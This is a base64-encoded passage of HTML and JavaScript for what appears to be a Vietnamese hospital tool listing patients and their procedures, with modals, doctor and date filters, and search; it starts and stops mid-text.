YW5oIHPDoWNoIHRo4bunIHRodeG6rXQgdOG7q25nIGLhu4duaCBuaMOibi0tPg0KPCEtLSBNb2RhbCBEYW5oIHPDoWNoIGLhu4duaCBuaMOibiAtLT4NCjxkaXYgaWQ9InBhdGllbnRMaXN0TW9kYWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDt6LWluZGV4OjExMDgwOyI+DQogIDxkaXYgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO2luc2V0OjA7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSkiIG9uY2xpY2s9ImNsb3NlUGF0aWVudExpc3QoKSI+PC9kaXY+DQogIDxkaXYgY2xhc3M9Im1vZGFsLWJhc2UgbW9kYWwtbGFyZ2UiPg0KICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47cGFkZGluZzoxNHB4IDE2cHg7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2U1ZTdlYiI+DQogICAgICA8aDMgc3R5bGU9Im1hcmdpbjowO2ZvbnQtc2l6ZToxOHB4Ij5EYW5oIHPDoWNoIGLhu4duaCBuaMOibjwvaDM+DQogICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImNsb3NlUGF0aWVudExpc3QoKSI+xJDDs25nPC9idXR0b24+DQogICAgPC9kaXY+DQogICAgDQogICAgPCEtLSBC4buZIGzhu41jIC0tPg0KICAgIDxkaXYgY2xhc3M9ImZpbHRlci1jb250YWluZXIiIHN0eWxlPSJwYWRkaW5nOjE2cHggMTZweCAwIDE2cHg7Ij4NCiAgICAgIDxkaXY+DQogICAgICAgIDxsYWJlbCBmb3I9InBhdGllbnREb2N0b3JGaWx0ZXIiPkLDoWMgc8SpIGNo4buJIMSR4buLbmg6PC9sYWJlbD4NCiAgICAgICAgPHNlbGVjdCBpZD0icGF0aWVudERvY3RvckZpbHRlciIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzttYXJnaW4tbGVmdDoxMHB4OyI+DQogICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQogICAgICAgIDwvc2VsZWN0Pg0KICAgICAgPC9kaXY+DQogICAgICA8ZGl2Pg0KICAgICAgICA8bGFiZWwgZm9yPSJwYXRpZW50U2VhcmNoIj5Uw6xtIGtp4bq/bTo8L2xhYmVsPg0KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9InBhdGllbnRTZWFyY2giIHBsYWNlaG9sZGVyPSJUw6puIEJOLCBtw6MgQk4sIG3DoyDEkWnhu4F1IHRy4buLIiANCiAgICAgICAgICAgICAgIHN0eWxlPSJ3aWR0aDoyNTBweDttYXJnaW4tbGVmdDoxMHB4OyI+DQogICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCiAgICANCiAgICA8IS0tIELhuqNuZyBkYW5oIHPDoWNoIGLhu4duaCBuaMOibiAtLT4NCiAgICA8ZGl2IHN0eWxlPSJwYWRkaW5nOjAgMTZweCAxNnB4IDE2cHg7Ij4NCiAgICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiIHN0eWxlPSJ3aWR0aDoxMDAlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgIDx0aD5Nw6MgQk48L3RoPg0KICAgICAgICAgICAgPHRoPlTDqm4gYuG7h25oIG5ow6JuPC90aD4NCiAgICAgICAgICAgIDx0aD5UdeG7lWk8L3RoPg0KICAgICAgICAgICAgPHRoPkLDoWMgc8SpIGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keSBpZD0icGF0aWVudExpc3RCb2R5Ij48L3Rib2R5Pg0KICAgICAgPC90YWJsZT4NCiAgICA8L2Rpdj4NCiAgPC9kaXY+DQo8L2Rpdj4NCg0KPCEtLSBNb2RhbCBDaGkgdGnhur90IGLhu4duaCBuaMOibiAtLT4NCjxkaXYgaWQ9InBhdGllbnREZXRhaWxNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwOTA7Ij4NCiAgPGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KSIgb25jbGljaz0iY2xvc2VQYXRpZW50RGV0YWlsKCkiPjwvZGl2Pg0KICA8ZGl2IGNsYXNzPSJtb2RhbC1iYXNlIG1vZGFsLWxhcmdlIj4NCiAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO3BhZGRpbmc6MTRweCAxNnB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNlNWU3ZWIiPg0KICAgICAgPGgzIHN0eWxlPSJtYXJnaW46MDtmb250LXNpemU6MThweCIgaWQ9InBhdGllbnREZXRhaWxUaXRsZSI+Q2hpIHRp4bq/dCBi4buHbmggbmjDom48L2gzPg0KICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJjbG9zZVBhdGllbnREZXRhaWwoKSI+xJDDs25nPC9idXR0b24+DQogICAgPC9kaXY+DQogICAgDQogICAgPCEtLSBC4buZIGzhu41jIG5nw6B5IC0tPg0KICAgIDxkaXYgY2xhc3M9ImZpbHRlci1jb250YWluZXIiIHN0eWxlPSJwYWRkaW5nOjE2cHggMTZweCAwIDE2cHg7Ij4NCiAgICAgIDxkaXY+DQogICAgICAgIDxsYWJlbCBmb3I9InBhdGllbnREYXRlRmlsdGVyIj5M4buNYyB0aGVvIG5nw6B5OjwvbGFiZWw+DQogICAgICAgIDxzZWxlY3QgaWQ9InBhdGllbnREYXRlRmlsdGVyIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvO21hcmdpbi1sZWZ0OjEwcHg7Ij4NCiAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgbmfDoHk8L29wdGlvbj4NCiAgICAgICAgPC9zZWxlY3Q+DQogICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCiAgICANCiAgICA8IS0tIELhuqNuZyBjaGkgdGnhur90IHRo4bunIHRodeG6rXQgLS0+DQogICAgPGRpdiBzdHlsZT0icGFkZGluZzowIDE2cHggMTZweCAxNnB4OyI+DQogICAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIiBzdHlsZT0id2lkdGg6MTAwJSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICA8dHI+DQogICAgICAgICAgICA8dGg+VGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGg+PGNlbnRlcj5UaOG7nWkgZ2lhbjwvY2VudGVyPjwvdGg+DQogICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iPkLDoWMgc8SpIGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keSBpZD0icGF0aWVudERldGFpbEJvZHkiPjwvdGJvZHk+DQogICAgICA8L3RhYmxlPg0KICAgIDwvZGl2Pg0KICA8L2Rpdj4NCjwvZGl2Pg0KPHNjcmlwdD4NCi8vIEJp4bq/biBsxrB1IHRy4buvIGThu68gbGnhu4d1IGLhu4duaCBuaMOibg0KbGV0IHBhdGllbnRMaXN0RGF0YSA9IFtdOw0KDQovLyBN4bufIG1vZGFsIGRhbmggc8OhY2ggYuG7h25oIG5ow6JuDQpmdW5jdGlvbiBvcGVuUGF0aWVudExpc3QoKSB7DQogICAgaWYgKCFhbGxQcm9jZWR1cmVzIHx8IGFsbFByb2NlZHVyZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgIGFsZXJ0KCdWdWkgbMOybmcga2nhu4NtIHRyYSBmaWxlIHRyxrDhu5tjIGtoaSB4ZW0gZGFuaCBzw6FjaCBi4buHbmggbmjDom4uJyk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgLy8gWOG7rSBsw70gZOG7ryBsaeG7h3UgYuG7h25oIG5ow6JuDQogICAgcHJvY2Vzc1BhdGllbnREYXRhKCk7DQogICAgDQogICAgLy8gSGnhu4NuIHRo4buLIG1vZGFsDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnRMaXN0TW9kYWwnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCn0NCg0KLy8gxJDDs25nIG1vZGFsIGRhbmggc8OhY2ggYuG7h25oIG5ow6JuDQpmdW5jdGlvbiBjbG9zZVBhdGllbnRMaXN0KCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50TGlzdE1vZGFsJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCn0NCg0KLy8gWOG7rSBsw70gZOG7ryBsaeG7h3UgYuG7h25oIG5ow6JuDQpmdW5jdGlvbiBwcm9jZXNzUGF0aWVudERhdGEoKSB7DQogICAgY29uc3QgcGF0aWVudE1hcCA9IG5ldyBNYXAoKTsNCiAgICANCiAgICAvLyBHb20gbmjDs20gZOG7ryBsaeG7h3UgdGhlbyBi4buHbmggbmjDom4gKGtow7RuZyBwaMOibiBiaeG7h3QgxJHhu6N0IMSRaeG7gXUgdHLhu4spDQogICAgYWxsUHJvY2VkdXJlcy5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICBjb25zdCBwYXRpZW50SWQgPSBwcm9jLnBhdGllbnRJZCB8fCAnS2jDtG5nIGPDsyc7DQogICAgICAgIGNvbnN0IHBhdGllbnROYW1lID0gcHJvYy5wYXRpZW50TmFtZSB8fCAnS2jDtG5nIGPDsyc7DQogICAgICAgIGNvbnN0IHBhdGllbnRBZ2UgPSBwcm9jLnBhdGllbnRBZ2UgfHwgJ0tow7RuZyBjw7MnOw0KICAgICAgICBjb25zdCBkb2N0b3IgPSBwcm9jLmRvY3RvciB8fCAnS2jDtG5nIGPDsyc7DQogICAgICAgIA0KICAgICAgICAvLyBU4bqhbyBrZXkgZHV5IG5o4bqldCBjaG8gYuG7h25oIG5ow6JuIChjaOG7iSBkw7luZyBtw6MgQk4gdsOgIHTDqm4pDQogICAgICAgIGNvbnN0IHBhdGllbnRLZXkgPSBgJHtwYXRpZW50SWR9XyR7cGF0aWVudE5hbWV9YDsNCiAgICAgICAgDQogICAgICAgIGlmICghcGF0aWVudE1hcC5oYXMocGF0aWVudEtleSkpIHsNCiAgICAgICAgICAgIHBhdGllbnRNYXAuc2V0KHBhdGllbnRLZXksIHsNCiAgICAgICAgICAgICAgICBwYXRpZW50SWQsDQogICAgICAgICAgICAgICAgcGF0aWVudE5hbWUsDQogICAgICAgICAgICAgICAgcGF0aWVudEFnZSwNCiAgICAgICAgICAgICAgICBkb2N0b3IsDQogICAgICAgICAgICAgICAgcHJvY2VkdXJlczogW3Byb2NdIC8vIEzGsHUgdOG6pXQgY+G6oyB0aOG7pyB0aHXhuq10IGPhu6dhIGLhu4duaCBuaMOibg0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAvLyBUaMOqbSB0aOG7pyB0aHXhuq10IHbDoG8gYuG7h25oIG5ow6JuIMSRw6MgdOG7k24gdOG6oWkNCiAgICAgICAgICAgIGNvbnN0IHBhdGllbnQgPSBwYXRpZW50TWFwLmdldChwYXRpZW50S2V5KTsNCiAgICAgICAgICAgIHBhdGllbnQucHJvY2VkdXJlcy5wdXNoKHByb2MpOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgLy8gQ2h1eeG7g24gTWFwIHRow6BuaCBt4bqjbmcNCiAgICBwYXRpZW50TGlzdERhdGEgPSBBcnJheS5mcm9tKHBhdGllbnRNYXAudmFsdWVzKCkpOw0KICAgIA0KICAgIC8vIEhp4buDbiB0aOG7iyBkYW5oIHPDoWNoDQogICAgcmVuZGVyUGF0aWVudExpc3QoKTsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgYuG7mSBs4buNYyBiw6FjIHPEqQ0KICAgIHVwZGF0ZVBhdGllbnREb2N0b3JGaWx0ZXIoKTsNCn0NCg0KLy8gSGnhu4NuIHRo4buLIGRhbmggc8OhY2ggYuG7h25oIG5ow6JuDQpmdW5jdGlvbiByZW5kZXJQYXRpZW50TGlzdCgpIHsNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50TGlzdEJvZHknKTsNCiAgICBjb25zdCBkb2N0b3JGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERvY3RvckZpbHRlcicpLnZhbHVlOw0KICAgIGNvbnN0IHNlYXJjaFRlcm0gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudFNlYXJjaCcpLnZhbHVlLnRvTG93ZXJDYXNlKCk7DQogICAgDQogICAgLy8gTOG7jWMgZOG7ryBsaeG7h3UNCiAgICBsZXQgZmlsdGVyZWREYXRhID0gcGF0aWVudExpc3REYXRhOw0KICAgIA0KICAgIGlmIChkb2N0b3JGaWx0ZXIgIT09ICdhbGwnKSB7DQogICAgICAgIGZpbHRlcmVkRGF0YSA9IGZpbHRlcmVkRGF0YS5maWx0ZXIocCA9PiBwLmRvY3RvciA9PT0gZG9jdG9yRmlsdGVyKTsNCiAgICB9DQogICAgDQogICAgaWYgKHNlYXJjaFRlcm0pIHsNCiAgICAgICAgZmlsdGVyZWREYXRhID0gZmlsdGVyZWREYXRhLmZpbHRlcihwID0+IA0KICAgICAgICAgICAgcC5wYXRpZW50TmFtZS50b0xvd2VyQ2FzZSgpLmluY2x1ZGVzKHNlYXJjaFRlcm0pIHx8DQogICAgICAgICAgICBwLnBhdGllbnRJZC50b0xvd2VyQ2FzZSgpLmluY2x1ZGVzKHNlYXJjaFRlcm0pDQogICAgICAgICk7DQogICAgfQ0KICAgIA0KICAgIC8vIEhp4buDbiB0aOG7iw0KICAgIHRib2R5LmlubmVySFRNTCA9ICcnOw0KICAgIA0KICAgIGlmIChmaWx0ZXJlZERhdGEubGVuZ3RoID09PSAwKSB7DQogICAgICAgIHRib2R5LmlubmVySFRNTCA9ICc8dHI+PHRkIGNvbHNwYW49IjQiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+S2jDtG5nIHTDrG0gdGjhuqV5IGLhu4duaCBuaMOibiBuw6BvPC90ZD48L3RyPic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgZmlsdGVyZWREYXRhLmZvckVhY2gocGF0aWVudCA9PiB7DQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc05hbWUgPSAncGF0aWVudC1yb3cnOw0KICAgICAgICByb3cub25jbGljayA9ICgpID0+IG9wZW5QYXRpZW50RGV0YWlsKHBhdGllbnQpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPHRkPiR7cGF0aWVudC5wYXRpZW50SWR9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3BhdGllbnQucGF0aWVudE5hbWV9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3BhdGllbnQucGF0aWVudEFnZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cGF0aWVudC5kb2N0b3J9PC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICB9KTsNCn0NCg0KLy8gQ+G6rXAgbmjhuq10IGLhu5kgbOG7jWMgYsOhYyBzxKkNCmZ1bmN0aW9uIHVwZGF0ZVBhdGllbnREb2N0b3JGaWx0ZXIoKSB7DQogICAgY29uc3QgZG9jdG9ycyA9IFsuLi5uZXcgU2V0KHBhdGllbnRMaXN0RGF0YS5tYXAocCA9PiBwLmRvY3RvcikpXS5zb3J0KCk7DQogICAgY29uc3Qgc2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREb2N0b3JGaWx0ZXInKTsNCiAgICANCiAgICBzZWxlY3QuaW5uZXJIVE1MID0gJzxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPicgKw0KICAgICAgICBkb2N0b3JzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQp9DQoNCi8vIEJp4bq/biBsxrB1IHRy4buvIGLhu4duaCBuaMOibiDEkWFuZyDEkcaw4bujYyB4ZW0NCmxldCBjdXJyZW50UGF0aWVudCA9IG51bGw7DQoNCi8vIE3hu58gbW9kYWwgY2hpIHRp4bq/dCBi4buHbmggbmjDom4NCmZ1bmN0aW9uIG9wZW5QYXRpZW50RGV0YWlsKHBhdGllbnQpIHsNCiAgICBjdXJyZW50UGF0aWVudCA9IHBhdGllbnQ7DQogICAgDQogICAgLy8gxJDhurd0IHRpw6p1IMSR4buBDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREZXRhaWxUaXRsZScpLnRleHRDb250ZW50ID0gDQogICAgICAgIGBDaGkgdGnhur90IGLhu4duaCBuaMOibjogJHtwYXRpZW50LnBhdGllbnROYW1lfSAoJHtwYXRpZW50LnBhdGllbnRJZH0pYDsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgYuG7mSBs4buNYyBuZ8OgeQ0KICAgIHVwZGF0ZVBhdGllbnREYXRlRmlsdGVyKHBhdGllbnQucHJvY2VkdXJlcyk7DQogICAgDQogICAgLy8gSGnhu4NuIHRo4buLIGNoaSB0aeG6v3QgKHThuqV0IGPhuqMgdGjhu6cgdGh14bqtdCBiYW4gxJHhuqd1KQ0KICAgIHJlbmRlclBhdGllbnREZXRhaWwocGF0aWVudC5wcm9jZWR1cmVzKTsNCiAgICANCiAgICAvLyBIaeG7g24gdGjhu4sgbW9kYWwNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERldGFpbE1vZGFsJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQp9DQoNCi8vIMSQw7NuZyBtb2RhbCBjaGkgdGnhur90IGLhu4duaCBuaMOibg0KZnVuY3Rpb24gY2xvc2VQYXRpZW50RGV0YWlsKCkgew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RGV0YWlsTW9kYWwnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgIGN1cnJlbnRQYXRpZW50ID0gbnVsbDsNCn0NCg0KLy8gQ+G6rXAgbmjhuq10IGLhu5kgbOG7jWMgbmfDoHkgY2hvIGNoaSB0aeG6v3QgYuG7h25oIG5ow6JuDQpmdW5jdGlvbiB1cGRhdGVQYXRpZW50RGF0ZUZpbHRlcihwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgZGF0ZXMgPSBbLi4ubmV3IFNldChwcm9jZWR1cmVzLm1hcChwID0+IHAuZGF0ZSkpXS5zb3J0KChhLCBiKSA9PiB7DQogICAgICAgIGNvbnN0IFtkYSwgbWEsIHlhXSA9IGEuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgY29uc3QgW2RiLCBtYiwgeWJdID0gYi5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgIH0pOw0KICAgIA0KICAgIGNvbnN0IHNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RGF0ZUZpbHRlcicpOw0KICAgIHNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjIG5nw6B5PC9vcHRpb24+JyArDQogICAgICAgIGRhdGVzLm1hcChkID0+IGA8b3B0aW9uIHZhbHVlPSIke2R9Ij4ke2R9PC9vcHRpb24+YCkuam9pbignJyk7DQp9DQoNCi8vIEhp4buDbiB0aOG7iyBjaGkgdGnhur90IHRo4bunIHRodeG6rXQgY+G7p2EgYuG7h25oIG5ow6JuDQpmdW5jdGlvbiByZW5kZXJQYXRpZW50RGV0YWlsKHByb2NlZHVyZXMpIHsNCiAgICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RGV0YWlsQm9keScpOw0KICAgIGNvbnN0IGRhdGVGaWx0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERhdGVGaWx0ZXInKS52YWx1ZTsNCiAgICBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgDQogICAgLy8gTOG7jWMgdGhlbyBuZ8OgeQ0KICAgIGxldCBmaWx0ZXJlZFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzOw0KICAgIGlmIChkYXRlRmlsdGVyICE9PSAnYWxsJykgew0KICAgICAgICBmaWx0ZXJlZFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzLmZpbHRlcihwID0+IHAuZGF0ZSA9PT0gZGF0ZUZpbHRlcik7DQogICAgfQ0KICAgIA0KICAgIC8vIFPhuq9wIHjhur9wIHRoZW8gbmfDoHkgdsOgIHRo4budaSBnaWFuDQogICAgZmlsdGVyZWRQcm9jZWR1cmVzLnNvcnQoKGEsIGIpID0+IHsNCiAgICAgICAgaWYgKGEuZGF0ZSAhPT0gYi5kYXRlKSB7DQogICAgICAgICAgICBjb25zdCBbZGEsIG1hLCB5YV0gPSBhLmRhdGUuc3BsaXQoJy8nKS5tYXAoTnVtYmVyKTsNCiAgICAgICAgICAgIGNvbnN0IFtkYiwgbWIsIHliXSA9IGIuZGF0ZS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgcmV0dXJuIG5ldyBEYXRlKHlhLCBtYSAtIDEsIGRhKSAtIG5ldyBEYXRlKHliLCBtYiAtIDEsIGRiKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gYS5zdGFydCAtIGIuc3RhcnQ7DQogICAgfSk7DQogICAgDQogICAgLy8gSGnhu4NuIHRo4buLDQogICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQogICAgDQogICAgaWYgKGZpbHRlcmVkUHJvY2VkdXJlcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgdGJvZHkuaW5uZXJIVE1MID0gJzx0cj48dGQgY29sc3Bhbj0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj5LaMO0bmcgY8OzIHRo4bunIHRodeG6rXQgbsOgbzwvdGQ+PC90cj4nOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIA0KICAgIGZpbHRlcmVkUHJvY2VkdXJlcy5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuY2xhc3NOYW1lID0gJ3BhdGllbnQtZGV0YWlsLXJvdyc7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICA8dGQ+JHtwcm9jLnByb2NlZHVyZX08L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtwcm9jLmRhdGV9PGJyLz4ke3Byb2MuZGlzcGxheVN0YXJ0fSAtPiAke3Byb2MuZGlzcGxheUVuZH08L2NlbnRlcj48L3RkPg0KICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIiBzdHlsZT0iJHtzaG93RG9jdG9yID8gJycgOiAnZGlzcGxheTpub25lJ30iPiR7cHJvYy5kb2N0b3J9PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke3Byb2Mub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJyl9PC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgdGJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICB9KTsNCn0NCg0KLy8gVGjDqm0gc+G7sSBraeG7h24gY2hvIGPDoWMgYuG7mSBs4buNYw0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgew0KICAgIC8vIELhu5kgbOG7jWMgdHJvbmcgZGFuaCBzw6FjaCBi4buHbmggbmjDom4NCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERvY3RvckZpbHRlcicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIHJlbmRlclBhdGllbnRMaXN0KTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudFNlYXJjaCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2lucHV0JywgcmVuZGVyUGF0aWVudExpc3QpOw0KICAgIA0KICAgIC8vIELhu5kgbOG7jWMgdHJvbmcgY2hpIHRp4bq/dCBi4buHbmggbmjDom4NCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERhdGVGaWx0ZXInKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICAgICAgaWYgKGN1cnJlbnRQYXRpZW50ICYmIGN1cnJlbnRQYXRpZW50LnByb2NlZHVyZXMpIHsNCiAgICAgICAgICAgIHJlbmRlclBhdGllbnREZXRhaWwoY3VycmVudFBhdGllbnQucHJvY2VkdXJlcyk7DQogICAgICAgIH0NCiAgICB9KTsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgaGnhu4NuIHRo4buLIGPhu5l0IGLDoWMgc8SpIGtoaSBjaGVja2JveCB0aGF5IMSR4buVaQ0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93RG9jdG9yQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICAgICAgY29uc3Qgc2hvd0RvY3RvciA9IHRoaXMuY2hlY2tlZDsNCiAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnI3BhdGllbnREZXRhaWxCb2R5IC5kb2N0b3ItY29sdW1uJykuZm9yRWFjaCh0ZCA9PiB7DQogICAgICAgICAgICB0ZC5zdHlsZS5kaXNwbGF5ID0gc2hvd0RvY3RvciA/ICcnIDogJ25vbmUnOw0KICAgICAgICB9KTsNCiAgICAgICAgDQogICAgICAgIC8vIEPFqW5nIGPhuq1wIG5o4bqtdCB0cm9uZyBkYW5oIHPDoWNoIGLhu4duaCBuaMOibiBu4bq/dSBtb2RhbCDEkWFuZyBt4bufDQogICAgICAgIGlmIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudExpc3RNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPT09ICdibG9jaycpIHsNCiAgICAgICAgICAgIHJlbmRlclBhdGllbnRMaXN0KCk7DQogICAgICAgIH0NCiAgICB9KTsNCn0pOw0KLy8gxJDDs25nIG1vZGFsIGLhurFuZyBFU0MNCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCBmdW5jdGlvbihlKSB7DQogICAgaWYgKGUua2V5ID09PSAnRXNjYXBlJykgew0KICAgICAgICBpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnRMaXN0TW9kYWwnKS5zdHlsZS5kaXNwbGF5ID09PSAnYmxvY2snKSB7DQogICAgICAgICAgICBjbG9zZVBhdGllbnRMaXN0KCk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RGV0YWlsTW9kYWwnKS5zdHlsZS5kaXNwbGF5ID09PSAnYmxvY2snKSB7DQogICAgICAgICAgICBjbG9zZVBhdGllbnREZXRhaWwoKTsNCiAgICAgICAgfQ0KICAgIH0NCn0pOzwvc2NyaXB0Pg0KDQo8c2NyaXB0Pg0KDQovLyA9PT09PT09PT09IFBPUFVQIENI4buMTiBUSOG7nEkgR0lBTiBUSOG7piBUSFXhuqxUID09PT09PT09PT0gLy8NCg0KLy8gQmnhur9uIHRvw6BuIGPhu6VjIGzGsHUgbOG7sWEgY2jhu41uIHRo4budaSBnaWFuDQpsZXQgdGltZU9wdGlvblNlbGVjdGVkID0gbnVsbDsNCg0KLy8gSMOgbSBoaeG7g24gdGjhu4sgcG9wdXAgc2F1IGtoaSDEkcSDbmcgbmjhuq1wIHRow6BuaCBjw7RuZw0KZnVuY3Rpb24gc2hvd1RpbWVPcHRpb25Qb3B1cCgpIHsNCiAgY29uc29sZS5sb2coIkhp4buDbiB0aOG7iyBwb3B1